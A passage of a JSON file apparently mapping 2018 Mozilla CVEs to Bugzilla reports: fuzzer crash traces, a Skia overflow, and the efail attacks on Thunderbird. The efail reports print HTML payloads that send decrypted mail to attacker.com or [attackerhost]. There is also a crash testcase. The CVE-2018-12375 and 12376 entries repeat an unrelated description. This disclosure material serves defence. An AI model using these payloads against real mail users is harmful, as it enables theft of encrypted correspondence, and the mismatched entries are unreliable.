        "description": "Note: This was found by Google's OSS-Fuzz and as a result there is a 90 day disclosure deadline. The attachment can be used as an input to the fuzzer: https://github.com/google/oss-fuzz/blob/master/projects/qcms/fuzz.cc [Environment] ASAN_OPTIONS = redzone=128:strict_string_check=1:strict_memcmp=1:allow_user_segv_handler=0:allocator_may_return_null=1:handle_sigfpe=1:handle_sigbus=1:detect_stack_use_after_return=1:alloc_dealloc_mismatch=0:print_scariness=1:strip_path_prefix=/workspace/:max_uar_stack_size_log=16:quarantine_size_mb=256:detect_odr_violation=0:handle_sigill=1:allocator_release_to_os_interval_ms=500:coverage=0:use_sigaltstack=1:fast_unwind_on_fatal=0:detect_leaks=1:print_summary=1:handle_abort=1:check_malloc_usable_size=0:detect_container_overflow=1:symbolize=0:handle_segv=1 ==1==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x609000000074 at pc 0x000000531f06 bp 0x7ffc9190bbc0 sp 0x7ffc9190bbb8 READ of size 4 at 0x609000000074 thread T0 SCARINESS: 27 (4-byte-read-heap-buffer-overflow-far-from-bounds) #0 0x531f05 in qcms_transform_module_clut_only /src/firefox/gfx/qcms/chain.c:153:21 #1 0x53005d in qcms_modular_transform_data /src/firefox/gfx/qcms/chain.c:975:17 #2 0x52faaa in qcms_chain_transform /src/firefox/gfx/qcms/chain.c:988:16 #3 0x540849 in qcms_transform_precacheLUT_float /src/firefox/gfx/qcms/transform.c:1182:9 #4 0x543ea8 in qcms_transform_create /src/firefox/gfx/qcms/transform.c:1248:28 #5 0x54b859 in transform(_qcms_profile*, _qcms_profile*, int) /src/fuzz.cc:24:31 #6 0x54b772 in LLVMFuzzerTestOneInput /src/fuzz.cc:64:3 #7 0x54998f in ExecuteFilesOnyByOne(int, char**) /src/libfuzzer/afl/afl_driver.cpp:301:5 #8 0x549f3e in main /src/libfuzzer/afl/afl_driver.cpp:339:12 #9 0x7f3d3e62a82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/libc-start.c:291 #10 0x41c978 in _start 0x609000000074 is located 12 bytes to the left of 1-byte region [0x609000000080,0x609000000081) allocated by thread T0 here: #0 0x4ea807 in malloc _asan_rtl_ #1 0x52e3b7 in qcms_modular_transform_create_mAB /src/firefox/gfx/qcms/chain.c:584:10 #2 0x52d203 in qcms_modular_transform_create_input /src/firefox/gfx/qcms/chain.c:723:19 #3 0x52fbf8 in qcms_modular_transform_create /src/firefox/gfx/qcms/chain.c:902:16 #4 0x52fa71 in qcms_chain_transform /src/firefox/gfx/qcms/chain.c:986:50 #5 0x540849 in qcms_transform_precacheLUT_float /src/firefox/gfx/qcms/transform.c:1182:9 #6 0x543ea8 in qcms_transform_create /src/firefox/gfx/qcms/transform.c:1248:28 #7 0x54b859 in transform(_qcms_profile*, _qcms_profile*, int) /src/fuzz.cc:24:31 #8 0x54b772 in LLVMFuzzerTestOneInput /src/fuzz.cc:64:3 #9 0x54998f in ExecuteFilesOnyByOne(int, char**) /src/libfuzzer/afl/afl_driver.cpp:301:5 #10 0x549f3e in main /src/libfuzzer/afl/afl_driver.cpp:339:12 #11 0x7f3d3e62a82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/libc-start.c:291 SUMMARY: AddressSanitizer: heap-buffer-overflow (/mnt/scratch0/clusterfuzz/slave-bot/builds/clusterfuzz-builds-afl_qcms_6de1215797ff093b4b972acc94def85d38f18127/revisions/fuzz+0x531f05) Shadow bytes around the buggy address: 0x0c127fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c127fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c127fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c127fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c127fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c127fff8000: fa fa fa fa fa fa fa fa fa fa fa fa fa fa[fa]fa 0x0c127fff8010: 01 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c127fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c127fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c127fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c127fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==1==ABORTING"
      }
    ],
    "CVE-2018-12367": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1462891",
        "title": "PerformanceNavigationTiming should reduce the time precision",
        "description": "It doesn't seem that PerformanceNavigationTiming::{UnloadEventStart,UnloadEventEnd,DomInteractive,...} use nsRFPService::ReduceTimePrecisionAsMSecs."
      }
    ],
    "CVE-2018-12370": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1456652",
        "title": "SameSite cookie Reader view patch bypass",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36 Steps to reproduce: 1. Go to https://test.shhnjk.com/read_bypass.html 2. Click reader view icon 3. Click on \"Click ME\" link 4. Exit Reader view in new tab Actual results: SameSite cookie not sent. Expected results: SameSite cookie is sent when exiting Reader view at the end. Firefox doesn't fully track \"Site for cookie\" when exiting Reader view. Using various tricks in Reader view (target blank with # and meta refresh), attacker can start Reader view from attacker site and navigate to victim site without exiting Reader view. Which makes it possible to end in a state where Reader view holds CSRF payload within Reader view, and it is triggered when exiting Reader view."
      }
    ],
    "CVE-2018-12371": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1465686",
        "title": "Heap overflow write in SkEdgeBuilder::buildPoly",
        "description": "User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Build ID: 20180517113820 Steps to reproduce: This is a variant of vulnerability hrer:https://bugzilla.mozilla.org/show_bug.cgi?id=1418447 System: Ubuntu 16.04.4 LTS (64bit) Firefox version: 60.0.1 (64-bit) RAM size:16G SWAP size:5.9G Root cause: https://searchfox.org/mozilla-central/source/gfx/skia/skia/src/core/SkEdgeBuilder.cpp#255 SkPath::Iter iter(path, true); SkPoint pts[4]; SkPath::Verb verb; size_t maxEdgeCount = path.countPoints(); if (iclip) { // clipping can turn 1 line into (up to) kMaxClippedLineSegments, since // we turn portions that are clipped out on the left/right into vertical // segments. maxEdgeCount *= SkLineClipper::kMaxClippedLineSegments; } size_t edgeSize; char* edge; switch (fEdgeType) { case kEdge: edgeSize = sizeof(SkEdge); edge = (char*)fAlloc.makeArrayDefault<SkEdge>(maxEdgeCount); break; case kAnalyticEdge: edgeSize = sizeof(SkAnalyticEdge); edge = (char*)fAlloc.makeArrayDefault<SkAnalyticEdge>(maxEdgeCount); break; case kBezier: edgeSize = sizeof(SkLine); edge = (char*)fAlloc.makeArrayDefault<SkLine>(maxEdgeCount); break; } .................................... T* makeArrayDefault(size_t count) { uint32_t safeCount = SkTo<uint32_t>(count); \"SkTo<uint32_t>(count)\" just convert \"maxEdgeCount\" to a uint32_t type variable. So if \"maxEdgeCount\" is larger than 0x100000000(4G),....... Steps to reproduce: To trigger the vulnerability, we need about 16G memory. Open attached html file(with attached gdb) and clicker \"trigger\", ff will crash in less than 10 minutes.(My computer is pretty old, with better CPU and larger memory, ff should crash more quickly) (gdb) sharedlibrary libxul Reading symbols from /usr/lib/firefox/libxul.so...Reading symbols from /usr/lib/debug/.build-id/8d/03b3c494a48356d5df2ea89f4fcbfa565904c4.debug...done. done. (gdb) bt 8 #0 SkEdgeBuilder::CombineVertical (this=0x7ffce76b9750, edge=0x7f08dae5f018, last=0x1680000) at /build/firefox-AIw0T6/firefox-60.0.1+build2/gfx/skia/skia/src/core/SkEdgeBuilder.cpp:22 #1 0x00007f08e774ffe8 in SkEdgeBuilder::addPolyLine (shiftUp=23592960, edgePtr=@0x7ffce76b91c8: 0x7f08dae5f030, edgeSize=40, edge=@0x7ffce76b91c0: 0x7f08dae5f018 \"8\\\\\\334\\332\\b\\177\", pts=0x7ffce76b9240, this=0x7ffce76b9750) at /build/firefox-AIw0T6/firefox-60.0.1+build2/gfx/skia/skia/src/core/SkEdgeBuilder.h:110 #2 SkEdgeBuilder::buildPoly (this=this@entry=0x7ffce76b9750, path=..., iclip=iclip@entry=0x7ffce76b96b0, shiftUp=shiftUp@entry=2, canCullToTheRight=canCullToTheRight@entry=true) at /build/firefox-AIw0T6/firefox-60.0.1+build2/gfx/skia/skia/src/core/SkEdgeBuilder.cpp:306 #3 0x00007f08e7755b57 in SkEdgeBuilder::build (this=this@entry=0x7ffce76b9750, path=..., iclip=0x7ffce76b96b0, shiftUp=2, canCullToTheRight=<optimized out>, edgeType=SkEdgeBuilder::kEdge) at /build/firefox-AIw0T6/firefox-60.0.1+build2/gfx/skia/skia/src/core/SkEdgeBuilder.cpp:354 #4 0x00007f08e7755d7b in SkEdgeBuilder::build_edges (this=this@entry=0x7ffce76b9750, path=..., shiftedClip=shiftedClip@entry=0x7ffce76b96b0, shiftEdgesUp=shiftEdgesUp@entry=2, pathContainedInClip=pathContainedInClip@entry=false, edgeType=edgeType@entry=SkEdgeBuilder::kEdge) at /build/firefox-AIw0T6/firefox-60.0.1+build2/gfx/skia/skia/src/core/SkEdgeBuilder.cpp:457 #5 0x00007f08e77ab814 in sk_fill_path (path=..., clipRect=..., blitter=blitter@entry=0x7ffce76b9a10, start_y=-150, stop_y=150, shiftEdgesUp=shiftEdgesUp@entry=2, pathContainedInClip=false) at /build/firefox-AIw0T6/firefox-60.0.1+build2/gfx/skia/skia/src/core/SkScan_Path.cpp:406 #6 0x00007f08e74f46d6 in SkScan::SAAFillPath (path=..., blitter=blitter@entry=0x7ffce76ba618, ir=..., clipBounds=..., forceRLE=forceRLE@entry=false) at /build/firefox-AIw0T6/firefox-60.0.1+build2/gfx/skia/skia/src/core/SkScan_AntiPath.cpp:629 #7 0x00007f08e74f4d12 in SkScan::AntiFillPath (path=..., origClip=..., blitter=<optimized out>, blitter@entry=0x7ffce76ba618, forceRLE=forceRLE@entry=false, daaRecord=daaRecord@entry=0x0) at /build/firefox-AIw0T6/firefox-60.0.1+build2/gfx/skia/skia/src/core/SkScan_AntiPath.cpp:747 (More stack frames follow...)"
      }
    ],
    "CVE-2018-12372": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1419417",
        "title": "[efail] S/MIME and PGP decryption oracles can be built with HTML emails",
        "description": "User Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0 Build ID: 20170929010941 Steps to reproduce: In the scope of academic research within the efail project, in cooperation with Ruhr-University Bochum and FH Münster, Germany we discovered various security issues in Thunderbird: An attacker who is in possession of S/MIME or PGP encrypted messages can embed them into specially crafted HTML mails and re-send them to the intended receiver. When the message is read and decrypted by the receiver, the plaintext is leaked to an attacker-controlled server. Furthermore, this issue allows an attacker to spoof PGP signatures. The root cause for these vulnerabilities lies in the way Thunderbird handles multipart messages. The general cause is present since Thunderbird version 0.1, released in 2003. All issues are present in the current Thunderbird version 52.4.0 (if not stated otherwise). ******************************************************************************** *** General Cause: Multipart messages are rendered as a single HTML document *** ******************************************************************************** Thunderbird internally uses HTML to display emails. If a message consists of multiple parts, all parts are put into a single HTML document, separated by a <br>, <fieldset> and <div> tag:: <html> <head></head> <body> <BR><FIELDSET CLASS=\"mimeAttachmentHeader\"></FIELDSET><BR/> <div class=\"moz-text-html\" lang=\"x-western\">*part-01*</div> <BR><FIELDSET CLASS=\"mimeAttachmentHeader\"></FIELDSET><BR/> <div class=\"moz-text-html\" lang=\"x-western\">*part-02*</div> etc. </body> </html> This is dangerous to be used in combination with cryptography, because it allows an attacker to wrap encrypted or signed content into her own HTML/CSS code: multipart/mixed |--- Content-Type: text/html | [arbitrary HTML or CSS] |--- [enc or signed messages] +--- Content-Type: text/html [arbitrary HTML or CSS] **************************************** *** Issue A: Leaking encrypted mails *** **************************************** /Attacker model/: Attacker is in possession of S/MIME or PGP/MIME encrypted messages, which she may have obtained as passive man-in-the-middle or by actively hacking into the victim's mail server or gateway /Attacker's goal/: Leak the plaintext by wrapping the ciphertext into an HTML mail sent to and decrypted by the victim ------------------------------------------------------------- *Proof of concept 1: Leaking plaintext through reply/forward* ------------------------------------------------------------- Prerequisites: - victim reads and composes messages in HTML - victim replies or forwards the message Attack: The attacker can hide the encrypted part, for example, in an iframe: multipart/mixed |--- Content-Type: text/html | Please answer to this email | <iframe width=\"1\" height=\"1\" frameborder=\"0\"> |--- Content-Type: multipart/encrypted |--- Content-Type: application/pkcs7-mime +--- Content-Type: text/html </iframe> The encrypted part is decrypted as soon as the victim reads the mail. If the victim replies to or forwards the mail, the decrypted plaintext will be sent, hidden in the invisible iframe and without the victim noticing. Note that this variant of the attack only works if message bodys are viewed as original HTML (default) *and* the user checked `compose messages in HTML format' (non default). Also note that hundreds of collected S/MIME or PGP/MIME ciphertexts can be embedded in the multipart mail and all the plaintexts leaked with one single reply. ---------------------------------------------------------- *Proof of concept 2: Leaking plaintext through HTML forms* ---------------------------------------------------------- Prerequisites: - victim reads messages in HTML - victim submits an HTML form by clicking on an area in the message Attack: Another variant of the attack, which works since Thunderbird 3.0 is using HTML forms to leak the plaintext: multipart/mixed |--- Content-Type: text/html | <form action=\"https://attacker.com/leak\" method=\"post\"> | <button type=\"submit\"> | <textarea |--- Content-Type: multipart/encrypted +--- Content-Type: application/pkcs7-mime Again, the plaintext for hundreds of collected S/MIME or PGP/MIME ciphertexts could be leaked by a single form submission. The user still has to actively submit the form, but with CSS it is possible to make the form being submitted if the user clicks *somewhere* into the (harmless) message shown to him which may even security-aware users. Other variants may include setting up fake scrollbars or Thunderbird warnings that submit the form if clicked. ------------------------------------------------------------- *Proof of concept 3: Leaking plaintext through src attribute* ------------------------------------------------------------- Prerequisites: - victim reads messages in HTML - victim allows remote content (further attack variants possible, see below) Attack: Another variant of this attack is to use the HTML src attribute, for example, for invisible iframes or image tags to leak the plaintext: multipart/mixed |--- Content-Type: text/html | <img src='https://attacker.com/ |--- Content-Type: multipart/encrypted |--- Content-Type: application/pkcs7-mime +--- Content-Type: text/html '> After decryption, the plaintext is urlencoded and sent as HTTP GET request to the attacker if the user allows remote content to be loaded. To encourage this, there are various options: - The attacker may spoof the mail address to a `trusted' source which the victim already has whitelisted (for example, some company which requires remote image for their mails being readable) - The attacker may sent a fake newsletter/spam mail and leak the plaintext by tempting the victim to click on a `Click here to unsubscribe' link - From Thunderbird 12.0 to 52.0.1, remote content had automatically been loaded if a news:// uri schemes was used in the HTML src attribute which could be used to leak the plaintext to a NNTP server - In the current version (52.4.0), Thunderbird can be tricked into thinking a mail is an RSS feed if the mail begins with certain headers: From - Fri Nov 17 20:13:09 2017 X-Mozilla-Status2: 00000040 Note that this seems to work only for local (Movemail) message setups, not if the mail is fetched via IMAP or POP3 - In the current version (52.4.0), mailto links can be used to force an HTML context (even if the user has set messages to be neither viewed nor composed in HTML format). While most html tags seem to be filtered, <video poster=\"url\"> gets through and automatically triggers a connection: mailto:?html-body=%3Cvideo%20poster%3D%22http%3A%2F%2Fattacker.com%22%3E\"> Note however, that this can probably not be used to leak plaintext because we have not found a way to define multipart messages to be included in mailto: links - There may be other bypasses for remote content blocking like <link preconnect=\"...\"> which we reported in October (bug 1408867) Note that again multiple S/MIME and PGP/MIME messages can be leaked in a single mail that is read and decrypted. There seems to be an upper limited of 1024kB for the length of HTTP GET requests sent by Thunderbird, but an attacker can include multiple HTML tags with src attributes in case the messages should exceed this limit. Find attached three emails which leak S/MIME and PGP/MIME encrypted messages to localhost:8080. For a proof of concept, you need to replace the encrypted parts with S/MIME or PGP/MIME messages you have the private key for, obviously. ******************************************* *** Issue B: Signature Spoofing Attacks *** ******************************************* /Attacker model/: Attacker is in possession of a valid OpenPGP signature from the entity to be impersonated, which she may have obtained from email correspondence, public mailing lists, signed software packages, signed GitHub commits, etc; this should be a realistic scenario, so we don't even need an NSA-like attacker /Attacker's goal/: Given her own text, the attacker wants to spoof a correct signature to be displayed by Enigmail There are various ways to achieve this goal. CSS can be used to hide the signed part (for example, by setting the font size or color). Furthermore, the signed part can be embedded by and therefore hidden in HTML tags. Note that this attack does not seem to work for S/MIME because Thunderbird's S/MIME implementation only shows a valid signature if the whole message (including all parts) is correctly signed. ------------------------------------------------------------------- *Proof of concept 1: Signature spoofing with CSS and plaintext tag* ------------------------------------------------------------------- Prerequisites: - victim reads messages in HTML Attack: The signed part can be hidden by setting the font color to the default background color (white). Furthermore, the <plaintext> tag can be used to get rid of the border being displayed: multipart/mixed |--- Content-Type: text/html | [Arbitrary text inserted by the attacker] | <div style=\"color:white\"><plaintext> +--- Content-Type: multipart/signed [PGP signed part] ------------------------------------------------------------------ *Proof of concept 2: Signature spoofing with invisible iframe tag* ------------------------------------------------------------------ Prerequisites: - victim reads messages in HTML Attack: The signed part can be hidden in an invisible iframe: multipart/mixed |--- Content-Type: text/html | [Arbitrary text inserted by the attacker] | <iframe width=\"1\" height=\"1\" frameborder=\"0\" +--- Content-Type: multipart/signed [PGP signed part] Find attached two emails which are displayed as correctly signed by Phil Zimmermann in Thunderbird/Enigmail while the attacker can completely alter the actual text that is shown to the user."
      }
    ],
    "CVE-2018-12373": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1464667",
        "title": "Suppress <plaintext> in email messages",
        "description": "MDN says firefox doesn't support <plaintext> - https://developer.mozilla.org/en-US/docs/Web/HTML/Element/plaintext ... but it seems it does. It's not treated as <pre>, but really treated as <plaintext>, which has no closing tag(!!). This makes for some pretty interesting and unexpected dom trees in cases when you hope the parser would make sense of the garbage you throw at it. Like bug 1464056 comment 18 - where for some cases Thunderbird is pulling two doms together and displaying them in one. I'd suggest actually removing support for <plaintext> since at least according to mdn no browser supports it."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1464056",
        "title": "[efail] S/MIME plaintext can be leaked through HTML reply/forward",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0 Build ID: 20180326230345 Steps to reproduce: A variant of Efail's direct exfiltration attack still work in TB nightly (2018-05-22). S/MIME: decrypted MIME parts can be completely hidden with CSS; if user replies/forwards in HTML format the (non-visible) plaintext is leaked, otherwise (in text-only reply mode) the victim could be fooled by inserting newlines --------------------------------------------------- Content-Type: multipart/mixed; boundary=\"BOUNDARY\" --BOUNDARY Content-Type: text/html Reply please to this email <div style=\"color: red;\"> --BOUNDARY Content-Type: application/pkcs7-mime; name=\"smime.p7m\"; smime-type=enveloped-data Content-Transfer-Encoding: base64 ... --BOUNDARY-- --------------------------------------------------- Actual results: Quoted S/MIME plaintext is hidden and leaked when user replies/forwards the message Expected results: Plaintext should in other MIME parts than the very first one should not be quoted"
      }
    ],
    "CVE-2018-12374": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1462910",
        "title": "Efail: Using form to exfiltrate encrypted mail part by pressing enter in form field",
        "description": "One exfiltration method to exploit the efail vuln is to build a form with a textarea tag that contains an encrypted mail part. However Thunderbird tries to prevent sending forms with data. Until Thunderbird 52.7.0 it was possible to send a form with a <buttom type=\"submit\">. This was fixed in 52.8.0. I found however another bypass that still works in 52.8.0 and that allows to send the form content with minor user interaction (actually, the user has to press \"Enter\" once). A form can not only be sent by clicking, but also by pressing enter within a text input field. So in order to exfiltrate an attacker can have a first HTML part like this: <form action=\"https://[attackerhost]\" method=\"GET\"> <input type=text name=\"aa\" value=\"press enter\" autofocus> <textarea name=\"bb\"> Then comes the encrypted MIME part and then just a </textarea></form> to close the tags as the last mail part. The autofocus makes sure after opening the mail the cursor is already in the text field. Pressing enter will cause a GET request that passes the whole content of the encrypted part to [attackerhost]. Obviously it's possible to try to redesign the mail in order to increase the chance to get an Enter press from the user. E.g. one can hide the textarea (opacity:0) and maybe think of plausible things to display that may cause a user to press enter. In terms of better fixes, I believe allowing HTML forms to exist within HTML mails is a risky thing to begin with. Ideally I'd propose to filter out all form-related HTML tags before rendering a mail. Apart from that I believe different parts of a mail shouldn't be rendered within one HTML context. (Though I heard that TB is already working on changing this.) Furthermore I think it should be considered not allowing half-encrypted mails at all. Encryption should be an \"all or nothing\", i.e. displaying a mix of encrypted and unencrypted content seems inherently risky. [1] https://hg.mozilla.org/comm-central/rev/48d7285be1417167d9e230f28b7c7a85db1f4a53"
      }
    ],
    "CVE-2018-12375": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1478849%2C1433502%2C1480965%2C894215%2C1462693%2C1475431%2C1461027",
        "description": "One exfiltration method to exploit the efail vuln is to build a form with a textarea tag that contains an encrypted mail part. However Thunderbird tries to prevent sending forms with data. Until Thunderbird 52.7.0 it was possible to send a form with a <buttom type=\"submit\">. This was fixed in 52.8.0. I found however another bypass that still works in 52.8.0 and that allows to send the form content with minor user interaction (actually, the user has to press \"Enter\" once). A form can not only be sent by clicking, but also by pressing enter within a text input field. So in order to exfiltrate an attacker can have a first HTML part like this: <form action=\"https://[attackerhost]\" method=\"GET\"> <input type=text name=\"aa\" value=\"press enter\" autofocus> <textarea name=\"bb\"> Then comes the encrypted MIME part and then just a </textarea></form> to close the tags as the last mail part. The autofocus makes sure after opening the mail the cursor is already in the text field. Pressing enter will cause a GET request that passes the whole content of the encrypted part to [attackerhost]. Obviously it's possible to try to redesign the mail in order to increase the chance to get an Enter press from the user. E.g. one can hide the textarea (opacity:0) and maybe think of plausible things to display that may cause a user to press enter. In terms of better fixes, I believe allowing HTML forms to exist within HTML mails is a risky thing to begin with. Ideally I'd propose to filter out all form-related HTML tags before rendering a mail. Apart from that I believe different parts of a mail shouldn't be rendered within one HTML context. (Though I heard that TB is already working on changing this.) Furthermore I think it should be considered not allowing half-encrypted mails at all. Encryption should be an \"all or nothing\", i.e. displaying a mix of encrypted and unencrypted content seems inherently risky. [1] https://hg.mozilla.org/comm-central/rev/48d7285be1417167d9e230f28b7c7a85db1f4a53"
      }
    ],
    "CVE-2018-12376": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1469309%2C1469914%2C1450989%2C1480092%2C1480517%2C1481093%2C1478575%2C1471953%2C1473161%2C1466991%2C1468738%2C1483120%2C1467363%2C1472925%2C1466577%2C1467889%2C1480521%2C1478849",
        "description": "One exfiltration method to exploit the efail vuln is to build a form with a textarea tag that contains an encrypted mail part. However Thunderbird tries to prevent sending forms with data. Until Thunderbird 52.7.0 it was possible to send a form with a <buttom type=\"submit\">. This was fixed in 52.8.0. I found however another bypass that still works in 52.8.0 and that allows to send the form content with minor user interaction (actually, the user has to press \"Enter\" once). A form can not only be sent by clicking, but also by pressing enter within a text input field. So in order to exfiltrate an attacker can have a first HTML part like this: <form action=\"https://[attackerhost]\" method=\"GET\"> <input type=text name=\"aa\" value=\"press enter\" autofocus> <textarea name=\"bb\"> Then comes the encrypted MIME part and then just a </textarea></form> to close the tags as the last mail part. The autofocus makes sure after opening the mail the cursor is already in the text field. Pressing enter will cause a GET request that passes the whole content of the encrypted part to [attackerhost]. Obviously it's possible to try to redesign the mail in order to increase the chance to get an Enter press from the user. E.g. one can hide the textarea (opacity:0) and maybe think of plausible things to display that may cause a user to press enter. In terms of better fixes, I believe allowing HTML forms to exist within HTML mails is a risky thing to begin with. Ideally I'd propose to filter out all form-related HTML tags before rendering a mail. Apart from that I believe different parts of a mail shouldn't be rendered within one HTML context. (Though I heard that TB is already working on changing this.) Furthermore I think it should be considered not allowing half-encrypted mails at all. Encryption should be an \"all or nothing\", i.e. displaying a mix of encrypted and unencrypted content seems inherently risky. [1] https://hg.mozilla.org/comm-central/rev/48d7285be1417167d9e230f28b7c7a85db1f4a53"
      }
    ],
    "CVE-2018-12377": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1470260",
        "title": "heap-use-after-free in mozilla::RefreshDriverTimer::TickRefreshDrivers",
        "description": "The following testcase crashes the latest ASAN build of Firefox ESR 60 (BuildID=20180621121604). It requires the fuzzPriv extension and requires to be loaded from a HTTP server. I also requires the attached mini.xml in the same directory. crash.html: <script> var xhrp=XMLHttpRequest; function spin () { var x=new xhrp(); try{x.open(\"POST\",\"https://mozilla.org\",false);}catch(e){} try{x.send(\"X\");}catch(e){} } function start() { o5=document.createElementNS('http://www.w3.org/1999/xhtml','link'); window.top.setTimeout(fun0, 400); } function fun0() { o87=this; window.top.requestAnimationFrame(fun1); o5.href='mini.xml'; } function fun1() { fuzzPriv.trustedKeyEvent(o5,'press',false,false,false,false,13,0); spin(); spin(); window.fuzzPriv.callDrawWindow(0); xhrp=o87.XMLHttpRequest; spin(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==28373==ERROR: AddressSanitizer: heap-use-after-free on address 0x608000059d30 at pc 0x7fac2c8bff34 bp 0x7ffe862054f0 sp 0x7ffe862054e8 READ of size 1 at 0x608000059d30 thread T0 (Web Content) #0 0x7fac2c8bff33 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:313:26 #1 0x7fac2c8bf646 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:333:5 #2 0x7fac2c8c24fe in RunRefreshDrivers /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:774:5 #3 0x7fac2c8c24fe in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:687 #4 0x7fac2c8c2125 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:588:9 #5 0x7fac2d19016f in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /builds/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:68:16 #6 0x7fac263e7829 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:156:20 #7 0x7fac262bddde in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1968:28 #8 0x7fac25ede53e in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2134:25 #9 0x7fac25edb594 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2064:17 #10 0x7fac25edccbc in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1910:5 #11 0x7fac25edd318 in mozilla::ipc::MessageChannel::MessageTask::Run() /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1943:15 #12 0x7fac2503b1b6 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1040:14 #13 0x7fac25054970 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:517:10 #14 0x7fac25ee5ef6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:125:5 #15 0x7fac25e38889 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #16 0x7fac25e38889 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #17 0x7fac25e38889 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #18 0x7fac2c16544a in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27 #19 0x7fac2fa310bb in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:895:22 #20 0x7fac25e38889 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #21 0x7fac25e38889 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #22 0x7fac25e38889 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #23 0x7fac2fa30aa4 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:721:34 #24 0x4f6f2c in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:50:30 #25 0x4f6f2c in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #26 0x7fac4387f82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #27 0x4265bc in _start (/fuzzer3/esr60/firefox/firefox+0x4265bc) 0x608000059d30 is located 16 bytes 